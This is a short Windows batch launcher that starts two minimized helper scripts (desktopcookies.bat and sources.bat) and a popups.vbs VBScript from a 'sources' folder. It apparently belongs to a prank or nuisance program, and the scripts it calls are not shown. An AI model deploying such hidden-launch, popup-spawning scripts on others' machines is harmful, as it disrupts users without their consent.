@echo off
echo cookie
start /MIN sources\desktopcookies.bat
timeout /t 2
start /MIN sources\sources.bat
start "" wscript //nologo sources\popups.vbs
exit
